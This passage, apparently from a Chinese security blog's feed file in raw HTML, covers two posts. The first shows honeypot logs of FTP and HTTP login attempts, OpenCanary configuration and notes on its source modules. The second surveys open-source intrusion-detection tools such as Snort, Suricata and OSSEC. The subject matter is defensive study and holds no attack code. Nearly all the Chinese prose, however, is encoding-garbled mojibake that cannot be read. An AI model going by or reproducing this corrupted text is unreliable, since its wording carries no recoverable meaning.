class="hljs-string">&quot;nasLogin&quot;</span>, <span class="hljs-attr">&quot;USERAGENT&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Edg/90.0.818.42&quot;</span>, <span class="hljs-attr">&quot;USERNAME&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;, <span class="hljs-attr">&quot;logtype&quot;</span>: <span class="hljs-number">3001</span>, <span class="hljs-attr">&quot;node_id&quot;</span>: <span class="hljs-string">&quot;opencanary_device01&quot;</span>, <span class="hljs-attr">&quot;src_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>, <span class="hljs-attr">&quot;src_port&quot;</span>: <span class="hljs-number">55752</span>, <span class="hljs-attr">&quot;utc_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:35:34.959754&quot;</span>&#125;<br>&#123;<span class="hljs-attr">&quot;dst_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.2&quot;</span>, <span class="hljs-attr">&quot;dst_port&quot;</span>: <span class="hljs-number">80</span>, <span class="hljs-attr">&quot;local_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:35:40.035831&quot;</span>, <span class="hljs-attr">&quot;local_time_adjusted&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:35:40.035866&quot;</span>, <span class="hljs-attr">&quot;logdata&quot;</span>: &#123;<span class="hljs-attr">&quot;HOSTNAME&quot;</span>: <span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-attr">&quot;PASSWORD&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-attr">&quot;PATH&quot;</span>: <span class="hljs-string">&quot;/index.html&quot;</span>, <span class="hljs-attr">&quot;SKIN&quot;</span>: <span class="hljs-string">&quot;nasLogin&quot;</span>, <span class="hljs-attr">&quot;USERAGENT&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Edg/90.0.818.42&quot;</span>, <span class="hljs-attr">&quot;USERNAME&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;, <span class="hljs-attr">&quot;logtype&quot;</span>: <span class="hljs-number">3001</span>, <span class="hljs-attr">&quot;node_id&quot;</span>: <span class="hljs-string">&quot;opencanary_device01&quot;</span>, <span class="hljs-attr">&quot;src_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>, <span class="hljs-attr">&quot;src_port&quot;</span>: <span class="hljs-number">55772</span>, <span class="hljs-attr">&quot;utc_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:35:40.035860&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>21ç«¯å£</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&#123;<span class="hljs-string">&quot;dst_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.2&quot;</span>, <span class="hljs-string">&quot;dst_port&quot;</span>: <span class="hljs-number">21</span>, <span class="hljs-string">&quot;local_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:52:34.745897&quot;</span>, <span class="hljs-string">&quot;local_time_adjusted&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:52:34.745986&quot;</span>, <span class="hljs-string">&quot;logdata&quot;</span>: &#123;<span class="hljs-string">&quot;PASSWORD&quot;</span>: <span class="hljs-string">&quot;admin1&quot;</span>, <span class="hljs-string">&quot;USERNAME&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;, <span class="hljs-string">&quot;logtype&quot;</span>: <span class="hljs-number">2000</span>, <span class="hljs-string">&quot;node_id&quot;</span>: <span class="hljs-string">&quot;opencanary_device01&quot;</span>, <span class="hljs-string">&quot;src_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>, <span class="hljs-string">&quot;src_port&quot;</span>: <span class="hljs-number">57076</span>, <span class="hljs-string">&quot;utc_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:52:34.745964&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;dst_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.2&quot;</span>, <span class="hljs-string">&quot;dst_port&quot;</span>: <span class="hljs-number">21</span>, <span class="hljs-string">&quot;local_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:52:34.751212&quot;</span>, <span class="hljs-string">&quot;local_time_adjusted&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:52:34.751331&quot;</span>, <span class="hljs-string">&quot;logdata&quot;</span>: &#123;<span class="hljs-string">&quot;PASSWORD&quot;</span>: <span class="hljs-string">&quot;admin1&quot;</span>, <span class="hljs-string">&quot;USERNAME&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;, <span class="hljs-string">&quot;logtype&quot;</span>: <span class="hljs-number">2000</span>, <span class="hljs-string">&quot;node_id&quot;</span>: <span class="hljs-string">&quot;opencanary_device01&quot;</span>, <span class="hljs-string">&quot;src_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>, <span class="hljs-string">&quot;src_port&quot;</span>: <span class="hljs-number">57078</span>, <span class="hljs-string">&quot;utc_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:52:34.751236&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;dst_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.2&quot;</span>, <span class="hljs-string">&quot;dst_port&quot;</span>: <span class="hljs-number">21</span>, <span class="hljs-string">&quot;local_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:53:02.559717&quot;</span>, <span class="hljs-string">&quot;local_time_adjusted&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:53:02.559749&quot;</span>, <span class="hljs-string">&quot;logdata&quot;</span>: &#123;<span class="hljs-string">&quot;PASSWORD&quot;</span>: <span class="hljs-string">&quot;admin1&quot;</span>, <span class="hljs-string">&quot;USERNAME&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;, <span class="hljs-string">&quot;logtype&quot;</span>: <span class="hljs-number">2000</span>, <span class="hljs-string">&quot;node_id&quot;</span>: <span class="hljs-string">&quot;opencanary_device01&quot;</span>, <span class="hljs-string">&quot;src_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>, <span class="hljs-string">&quot;src_port&quot;</span>: <span class="hljs-number">57086</span>, <span class="hljs-string">&quot;utc_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:53:02.559741&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;dst_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.2&quot;</span>, <span class="hljs-string">&quot;dst_port&quot;</span>: <span class="hljs-number">21</span>, <span class="hljs-string">&quot;local_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:53:02.560316&quot;</span>, <span class="hljs-string">&quot;local_time_adjusted&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:53:02.560336&quot;</span>, <span class="hljs-string">&quot;logdata&quot;</span>: &#123;<span class="hljs-string">&quot;PASSWORD&quot;</span>: <span class="hljs-string">&quot;admin1&quot;</span>, <span class="hljs-string">&quot;USERNAME&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;, <span class="hljs-string">&quot;logtype&quot;</span>: <span class="hljs-number">2000</span>, <span class="hljs-string">&quot;node_id&quot;</span>: <span class="hljs-string">&quot;opencanary_device01&quot;</span>, <span class="hljs-string">&quot;src_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>, <span class="hljs-string">&quot;src_port&quot;</span>: <span class="hljs-number">57084</span>, <span class="hljs-string">&quot;utc_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:53:02.560332&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;dst_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.2&quot;</span>, <span class="hljs-string">&quot;dst_port&quot;</span>: <span class="hljs-number">21</span>, <span class="hljs-string">&quot;local_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:53:04.350338&quot;</span>, <span class="hljs-string">&quot;local_time_adjusted&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:53:04.350379&quot;</span>, <span class="hljs-string">&quot;logdata&quot;</span>: &#123;<span class="hljs-string">&quot;PASSWORD&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;USERNAME&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;, <span class="hljs-string">&quot;logtype&quot;</span>: <span class="hljs-number">2000</span>, <span class="hljs-string">&quot;node_id&quot;</span>: <span class="hljs-string">&quot;opencanary_device01&quot;</span>, <span class="hljs-string">&quot;src_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>, <span class="hljs-string">&quot;src_port&quot;</span>: <span class="hljs-number">57090</span>, <span class="hljs-string">&quot;utc_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:53:04.350363&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;dst_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.2&quot;</span>, <span class="hljs-string">&quot;dst_port&quot;</span>: <span class="hljs-number">21</span>, <span class="hljs-string">&quot;local_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:53:04.350905&quot;</span>, <span class="hljs-string">&quot;local_time_adjusted&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:53:04.350921&quot;</span>, <span class="hljs-string">&quot;logdata&quot;</span>: &#123;<span class="hljs-string">&quot;PASSWORD&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;USERNAME&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;, <span class="hljs-string">&quot;logtype&quot;</span>: <span class="hljs-number">2000</span>, <span class="hljs-string">&quot;node_id&quot;</span>: <span class="hljs-string">&quot;opencanary_device01&quot;</span>, <span class="hljs-string">&quot;src_host&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>, <span class="hljs-string">&quot;src_port&quot;</span>: <span class="hljs-number">57094</span>, <span class="hljs-string">&quot;utc_time&quot;</span>: <span class="hljs-string">&quot;2021-04-22 08:53:04.350917&quot;</span>&#125;<br><span class="hljs-built_in">r</span><br></code></pre></td></tr></table></figure><p>ç›‘æ§æ–‡ä»¶ä¿®æ”¹/ä½¿ç”¨hpfeedç­‰ç›´æ¥å‘é€jsonéƒ½å¯ä»¥ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®é‚®ä»¶æé†’</p><h2 id="æºç ç†è§£"><a href="#æºç ç†è§£" class="headerlink" title="æºç ç†è§£"></a>æºç ç†è§£</h2><h3 id="modules"><a href="#modules" class="headerlink" title="modules"></a>modules</h3><p><del>è¿™é‡Œçš„ç»å¤§éƒ¨åˆ†éƒ½ä½¿ç”¨äº†twistedæ¡†æ¶</del> ç»å¤§éƒ¨åˆ†éƒ½å¤ç”¨äº†twistedæ¡†æ¶ä¸‹çš„æœåŠ¡ä»£ç </p><h4 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h4><p>ä½¿ç”¨çš„<a href="https://github.com/desaster/kippo/blob/master/kippo/core/ssh.py">kippo/ssh.py</a>çš„ä»£ç ã€‚ä¸»è¦åŒºåˆ«æ˜¯<code>HoneyPotAvatar</code>ç±»ä¸­çš„å‡½æ•°ï¼Œå»æ‰äº†æ‰“å¼€shellæ‰§è¡Œå‘½ä»¤çš„ä»£ç ã€‚</p><img src="/2021/04/22/OpenCanary%E4%BD%BF%E7%94%A8%E5%8F%8A%E7%90%86%E8%A7%A3/Snipaste_2021-05-10_11-12-27.png" class=""><p>é«˜äº¤äº’çš„sshèœœç½å¯ä»¥çœ‹<a href="https://github.com/cowrie/cowrie">cowrie/cowrie: Cowrie SSH/Telnet Honeypot</a></p><h4 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h4><p>ç±»<code>LoggingFTP</code><br>å¤ç”¨äº†twistedæ¡†æ¶çš„FTPç»å¤§éƒ¨åˆ†ä»£ç ï¼Œåªæ˜¯é‡å†™äº†<code>ftp_PASS</code>å‡½æ•°</p><p>diffæ¯”è¾ƒä¹‹åï¼Œå”¯ä¸€çš„å·®åˆ«å°±æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">logdata = &#123;<span class="hljs-string">&#x27;USERNAME&#x27;</span>: self._user, <span class="hljs-string">&#x27;PASSWORD&#x27;</span>: password&#125;<br>self.factory.canaryservice.log(logdata, transport=self.transport)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¼šä¼ é€’ç”¨æˆ·åå’Œå¯†ç ï¼Œç„¶åè°ƒç”¨<code>__init__.py</code>é‡Œçš„<code>canaryservice.log</code>æ¥è·å–æºã€ç›®æ ‡ç«¯å£åœ°å€ã€‚</p><p>ç±»<code>CanaryFTP</code><br>åŠŸèƒ½ï¼šè®¾ç½®bannerï¼Œç«¯å£ï¼Œåœ°å€ï¼Œç„¶åè®¾ç½®æœåŠ¡<br>è¿™é‡Œå¦‚æœä¿®æ”¹Portalçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œå†™æˆå…è®¸ç™»å½•çš„è¯ä¼°è®¡å°±å¯ä»¥è¿›ä¸€æ­¥æ‹“å±•å˜æˆé«˜äº¤äº’èœœç½äº†ï¼Œä½†æ˜¯æ–‡ä»¶äº¤äº’è¿™ä¸ªåˆæ˜¯ä¸ªå¤§å‘0.0</p><h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><p><code>BasicLogin</code>è´Ÿè´£è®°å½•Getçš„ç™»å½•ä¿¡æ¯ï¼ŒPostçš„ç™»å½•ä¿¡æ¯ï¼Œä»¥åŠæ¸²æŸ“ç™»å½•ç•Œé¢</p><p>è°ƒç”¨æµç¨‹ï¼š<br>åˆå§‹åŒ–<code>CanaryHTTP</code>ç±»ï¼Œå…ˆå»<code>.opencanary.conf</code>è·å–httpçš„çš®ã€è®¾ç½®ç«¯å£ã€bannerï¼Œç„¶åè®¾ç½®é»˜è®¤é‡å®šå‘åˆ°index.htmlã€‚é¦–é¡µä¸ºindex.htmlã€‚</p><h5 id="æ·»åŠ è‡ªå®šä¹‰httpçš®æ–¹æ³•"><a href="#æ·»åŠ è‡ªå®šä¹‰httpçš®æ–¹æ³•" class="headerlink" title="æ·»åŠ è‡ªå®šä¹‰httpçš®æ–¹æ³•"></a>æ·»åŠ è‡ªå®šä¹‰httpçš®æ–¹æ³•</h5><p>httpçš„çš®æ”¾ç½®åœ¨<code>\opencanary\modules\data\http\skin</code>é‡Œï¼Œæœ‰<code>403.html</code>ï¼Œ<code>404.html</code>å’Œ<code>index.html</code>ã€‚</p><p>æ”¾ç½®ååœ¨</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-string">&quot;http.banner&quot;</span>: <span class="hljs-string">&quot;Apache/2.2.22 (Ubuntu)&quot;</span>,<br>   <span class="hljs-string">&quot;http.enabled&quot;</span>: <span class="hljs-literal">true</span>,<br>   <span class="hljs-string">&quot;http.port&quot;</span>: <span class="hljs-number">80</span>,<br><span class="hljs-string">&quot;http.skin&quot;</span>: <span class="hljs-string">&quot;nasLogin&quot;</span>,<br>   <span class="hljs-string">&quot;http.skin.list&quot;</span>: [<br>       &#123;<br>           <span class="hljs-string">&quot;desc&quot;</span>: <span class="hljs-string">&quot;Plain HTML Login&quot;</span>,<br>           <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;basicLogin&quot;</span><br>       &#125;,<br>       &#123;<br>           <span class="hljs-string">&quot;desc&quot;</span>: <span class="hljs-string">&quot;Synology NAS Login&quot;</span>,<br>           <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;nasLogin&quot;</span><br>       &#125;<br>   ],<br></code></pre></td></tr></table></figure><p>æ·»åŠ descï¼Œnameï¼Œä»¥åŠhttp.skinä¸­é…ç½®ä¸Šé€‰ç”¨çš„çš®</p><h4 id="httpproxy"><a href="#httpproxy" class="headerlink" title="httpproxy"></a>httpproxy</h4><p><code>PROFILES</code>é‡Œé»˜è®¤è®¾ç½®äº†<code>ms-isa</code>å’Œ<code>squid</code>çš„</p><p>ToDo</p><h3 id="init"><a href="#init" class="headerlink" title="init"></a><strong>init</strong></h3><p>ToDo</p><h3 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h3><p>å‡½æ•°<code>__init__</code><br>åŠŸèƒ½ï¼šè´Ÿè´£è¯»å–ä¸‰ä¸ªä½ç½®çš„é…ç½®æ–‡ä»¶</p><p>å‡½æ•°<code>moduleEnabled</code><br>åŠŸèƒ½ï¼šåˆ¤æ–­æ¨¡ç»„æ˜¯å¦å¯ç”¨</p><p>å‡½æ•°<code>getVal</code><br>åŠŸèƒ½ï¼šè·å–é…ç½®çš„æŸä¸ªå€¼</p><p>å‡½æ•°<code>setVaules</code><br>åŠŸèƒ½ï¼šè®¾ç½®æ‰€æœ‰æœ‰æ•ˆçš„å€¼å’Œè¿”å›é”™è¯¯å€¼</p><p>â€¦â€¦</p><h3 id="honeycred"><a href="#honeycred" class="headerlink" title="honeycred"></a>honeycred</h3><p>Todo: ææ¸…æ¥š<code>honeycreds</code> æ˜¯å¹²å•¥çš„</p><p>å‡½æ•°<code>buildHoneyCredHook</code><br>åŠŸèƒ½ï¼šè®¾ç½®é’©å­æ–¹æ³•ï¼ŒéªŒè¯èœœç½å‡­è¯ï¼ˆï¼Ÿï¼‰</p><h3 id="iphelper"><a href="#iphelper" class="headerlink" title="iphelper"></a>iphelper</h3><p>è½¬æ¢å’ŒéªŒè¯ip</p><h3 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h3><p>ç±»<code>LoggerBase</code><br>åŠŸèƒ½ï¼šå®šä¹‰æŠ¥é”™ç±»å‹å’Œè§„èŒƒlogè¾“å‡ºæ ¼å¼</p><p>ç±»<code>PyLogger</code><br>åŠŸèƒ½ï¼šç»§æ‰¿LoggerBaseï¼Œé…ç½®æ—¥å¿—è®°å½•å·¥å…·logging<br>å®ç°ï¼šä½¿ç”¨äº† <a href="https://docs.python.org/zh-cn/3/library/logging.html#module-logging" title="logging: Flexible event logging system for applications."><code>logging</code></a> -â€“ Python çš„æ—¥å¿—è®°å½•å·¥å…·</p><p>ç±»<code>SocketJSONHandler</code><br>åŠŸèƒ½ï¼šé€šè¿‡TCPå‘é€jsonä¿¡æ¯<br>å®ç°ï¼šä½¿ç”¨ <a href="https://docs.python.org/zh-cn/3/library/logging.handlers.html#module-logging.handlers" title="logging.handlers: Handlers for the logging module."><code>logging.handlers</code></a> </p><p>ç±»<code>HpfeedsHandler</code><br>åŠŸèƒ½ï¼šå‘é€<a href="https://github.com/hpfeeds/hpfeeds">hpfeeds/hpfeeds: Honeynet Project generic authenticated datafeed protocol</a>åè®®çš„æ•°æ®åŒ…</p><p>ç±»<code>SlackHandler</code><br>åŠŸèƒ½ï¼šæˆ‘çŒœæ˜¯æŠŠä¿¡æ¯å‘é€åˆ°slackè¿™ä¸ªç±»ä¼¼é’‰é’‰çš„åŠå…¬è½¯ä»¶ä¸Š</p><p>ç±»<code>TeamsHandler</code><br>åŠŸèƒ½ï¼šæŠ¥è­¦ä¿¡æ¯å‘é€åˆ°teamsè¿™ä¸ªè½¯ä»¶ä¸Š</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å®‰å…¨äº§å“å­¦ä¹ </title>
    <link href="/2021/04/20/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/04/20/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="æ–¹å‘"><a href="#æ–¹å‘" class="headerlink" title="æ–¹å‘"></a>æ–¹å‘</h2><p>å…ˆæ˜ç¡®æ–¹å‘<del>è¿˜æ˜¯å¾—çœ‹æ‹›çš„äººçš„</del>ï¼Œå·²çŸ¥éƒ¨åˆ†æ–¹å‘ä¸ºï¼š</p><ul><li>å…¥ä¾µæ£€æµ‹ï¼ˆåŸºäºä¸»æœºçš„HIDSå’ŒåŸºäºç½‘ç»œçš„NIDSï¼‰</li><li>èœœç½</li><li>waf</li><li>é˜²ç«å¢™</li><li>æ—¥å¿—ä¸å®¡è®¡å®‰å…¨</li><li>æ¼æ´æ‰«æç³»ç»Ÿï¼ˆwebã€è½¯ä»¶ã€iotç­‰ï¼‰</li><li>ç«¯ç‚¹æ£€æµ‹å’Œå“åº”è§£å†³æ–¹æ¡ˆ ï¼ˆEDRï¼‰å’Œç«¯ç‚¹ä¿æŠ¤å¹³å°ï¼ˆEPPï¼‰</li></ul><p>ä¸‹é¢çš„å¯ä»¥çœ‹æ¥äº†è§£ä¸€ä¸‹</p><h3 id="å…¥ä¾µæ£€æµ‹ï¼ˆåŸºäºä¸»æœºçš„HIDSå’ŒåŸºäºç½‘ç»œçš„NIDSï¼‰"><a href="#å…¥ä¾µæ£€æµ‹ï¼ˆåŸºäºä¸»æœºçš„HIDSå’ŒåŸºäºç½‘ç»œçš„NIDSï¼‰" class="headerlink" title="å…¥ä¾µæ£€æµ‹ï¼ˆåŸºäºä¸»æœºçš„HIDSå’ŒåŸºäºç½‘ç»œçš„NIDSï¼‰"></a>å…¥ä¾µæ£€æµ‹ï¼ˆåŸºäºä¸»æœºçš„HIDSå’ŒåŸºäºç½‘ç»œçš„NIDSï¼‰</h3><p>å†…å®¹æœ‰æ‰€å‚è€ƒ<a href="https://zhuanlan.zhihu.com/p/91096046">ä½ éœ€è¦å¾—å¼€æºå…¥ä¾µæ£€æµ‹ç³»ç»Ÿéƒ½åœ¨è¿™é‡Œ</a></p><ol><li><p>NIPS <a href="https://github.com/snort3/snort3">snort3/snort3: Snort++</a></p><ul><li>C++ 94.9%</li><li>å…è´¹ä»˜è´¹åŒºåˆ«æ˜¯è¿‡æ»¤è§„åˆ™ï¼Œå…è´¹çš„è§„åˆ™æ¥è‡ªäºç¤¾åŒº</li></ul><p>ä½“ç³»ç»“æ„ï¼š<br><img src="http://drops.xmd5.com/full/996e5c4e7af5f24853cfd14d0deba9bc53129aa1.jpg" alt="Paste_Image.png"></p><blockquote><ul><li>æ•°æ®åŒ…å—…æ¢æ¨¡å—ï¼Œä¸»è¦è´Ÿè´£ç›‘å¬ç½‘ç»œæ•°æ®åŒ…ï¼Œå¹¶æ ¹æ®TCP/IPåè®®è§£ææ•°æ®åŒ…ã€‚</li><li>é¢„å¤„ç†æ¨¡å—ï¼Œ1.åŒ…é‡ç»„é¢„å¤„ç†å™¨ï¼Œå®ƒçš„ä½œç”¨æ˜¯ä¸ºäº†é˜²æ­¢æ”»å‡»ä¿¡æ¯è¢«æ‹†åˆ†åˆ°å¤šä¸ªåŒ…ä¸­è€Œ é€ƒé¿äº†Snortçš„æ£€æµ‹ï¼›2.åè®®ç¼–ç é¢„å¤„ç†å™¨ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯æŠŠæ•°æ®åŒ…åè®®è§£ç æˆä¸€ä¸ªç»Ÿä¸€çš„æ ¼å¼ï¼Œå†ä¼ é€ç»™æ£€æµ‹æ¨¡å—ï¼›3.åè®®å¼‚å¸¸æ£€æµ‹é¢„å¤„å™¨ã€‚</li><li>æ£€æµ‹å¼•æ“æ¨¡å—ï¼Œå½“é¢„å¤„ç†å™¨æŠŠæ•°æ®åŒ…é€è¿‡æ¥åï¼Œæ£€æµ‹å¼•æ“å°†è¿™äº›æ•°æ®åŒ…ä¸ä¸‰ç»´é“¾è¡¨å½¢å¼çš„æ£€æµ‹è§„åˆ™è¿›è¡ŒåŒ¹é…ï¼Œä¸€æ—¦å‘ç°æ•°æ®åŒ…ä¸­çš„å†…å®¹å’ŒæŸæ¡è§„åˆ™ç›¸åŒ¹é…ï¼Œå°±é€šçŸ¥æŠ¥è­¦æ¨¡å—ã€‚</li><li>æŠ¥è­¦/æ—¥å¿—æ¨¡å—ï¼Œæ£€æµ‹å¼•æ“å°†æ•°æ®åŒ…ä¼ é€ç»™æŠ¥è­¦æ¨¡å—åï¼ŒæŠ¥è­¦æ¨¡å—ä¼šæ ¹æ®è§„åˆ™å®šä¹‰ï¼ˆalertï¼Œlog..ï¼‰å¯¹å…¶è¿›è¡Œä¸åŒçš„å¤„ç†ï¼ˆæ•°æ®åº“ï¼Œæ—¥å¿—ï¼‰ã€‚</li></ul><p>ä¸Šå›¾å’Œä»‹ç» æ¥æº<a href="http://drops.xmd5.com/static/drops/%E6%9D%A9%E6%84%AE%E6%B7%AE%E7%80%B9%E5%A4%8A%E5%8F%8F-9232.html">SNORTå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ | WooYunçŸ¥è¯†åº“</a></p></blockquote><ol start="2"><li>NIDSå’ŒHIDS <a href="https://github.com/Security-Onion-Solutions/securityonion">Security-Onion-Solutions/securityonion: Security Onion 2 - Linux distro for threat hunting, enterprise security monitoring, and log management</a></li></ol></li></ol><ul><li>Shell 73.6%</li><li>å¸¦æœ‰UI </li></ul><p><img src="https://pic2.zhimg.com/80/v2-6479463e40f82cb47968ba4c078856b9_1440w.jpg" alt=""><br><del>åŒ…ç½—ä¸‡è±¡</del></p><blockquote><p>Security Onioné‡Œé¢çš„ç»„ä»¶åŒ…æ‹¬ï¼šsnortï¼ˆå…¥ä¾µæ£€æµ‹å¼•æ“ï¼‰ã€suricataï¼ˆå…¥ä¾µæ£€æµ‹å¼•æ“ï¼‰ã€broï¼ˆå…¥ä¾µæ£€æµ‹åˆ†æç³»ç»Ÿï¼‰ã€sguilï¼ˆå…¥ä¾µæ£€æµ‹åˆ†æç³»ç»Ÿï¼‰ã€squertï¼ˆå‰ç«¯æ˜¾ç¤ºï¼‰ã€snorbyï¼ˆå‰ç«¯æ˜¾ç¤ºï¼‰ã€wiresharkï¼ˆæŠ“åŒ…ï¼‰ã€xplicoï¼ˆæµé‡å®¡è®¡ï¼‰ã€‚å¤§è‡´åˆ†ç±»å¦‚ä¸‹ï¼š</p><ul><li>å®Œæ•´æ•°æ®åŒ…æ•è·ï¼›</li><li>åŸºäºç½‘ç»œå’Œä¸»æœºçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼ˆHIDSå’ŒNIDSï¼‰;</li><li>å¼ºå¤§çš„åˆ†æå·¥å…·</li></ul><p>ä¸Šå›¾å’Œä»‹ç»æ¥æº <a href="https://zhuanlan.zhihu.com/p/34072611">Security Onionä»‹ç» - çŸ¥ä¹</a></p></blockquote><ol start="3"><li>NIDS <a href="https://github.com/OISF/suricata">OISF/suricata: Suricata git repository maintained by the OISF</a></li></ol><ul><li>C 88.1%<blockquote><p>Engine</p><ul><li>Network Intrusion Detection System (NIDS) engine</li><li>Network Intrusion Prevention System (NIPS) engine</li><li>Network Security Monitoring (NSM) engine<br>ç­‰ç­‰</li></ul></blockquote></li></ul><ol start="4"><li><a href="https://github.com/zeek/zeek">zeek/zeek: Zeek is a powerful network analysis framework that is much different from the typical IDS you may know.</a></li></ol><p>network security monitor (NSM)</p><ul><li>C++ 51.4%   Zeek 44.6%</li></ul><ol start="5"><li><a href="https://github.com/ossec/ossec-hids">ossec/ossec-hids: OSSEC is an Open Source Host-based Intrusion Detection System that performs log analysis, file integrity checking, policy monitoring, rootkit detection, real-time alerting and active response.</a></li></ol><ul><li>C 87.2%</li><li>log analysis æ—¥å¿—åˆ†æ</li><li>file integrity checking   æ–‡ä»¶å®Œæ•´æ€§æ£€æŸ¥</li><li>policy monitoring ç›‘æ§ç­–ç•¥</li><li>rootkit detection åŠ è½½åˆ°æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­çš„æ¶æ„è½¯ä»¶ æ£€æµ‹</li><li>real-time alerting å®æ—¶æé†’</li><li>active response </li></ul><img src="/2021/04/20/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E5%AD%A6%E4%B9%A0/Snipaste_2021-04-20_15-38-19.png" class=""><blockquote><p>å›¾ç‰‡æ¥æº<a href="https://zhuanlan.zhihu.com/p/54993714">å¼€æºEDR(OSSEC)åŸºç¡€ç¯‡- 03 - ç›®å½•ç»“æ„ä¸å®ç”¨å·¥å…· - çŸ¥ä¹</a></p></blockquote><ol start="6"><li><a href="https://github.com/Tripwire/tripwire-open-source">Tripwire/tripwire-open-source: Open Source TripwireÂ®</a></li></ol><ul><li>C++ 81.1%</li><li>security and data integrity tool for monitoring and alerting on file &amp; directory changes.</li></ul><ol start="7"><li><a href="https://github.com/aide/aide">aide/aide: aide source code</a></li></ol><ul><li>C 84.7%</li><li>è¢«å¼€å‘æˆTripwireçš„ä¸€ä¸ªæ›¿ä»£å“</li></ul><h3 id="èœœç½"><a href="#èœœç½" class="headerlink" title="èœœç½"></a>èœœç½</h3><p>åˆæ­¥äº†è§£å¯ä»¥çœ‹<a 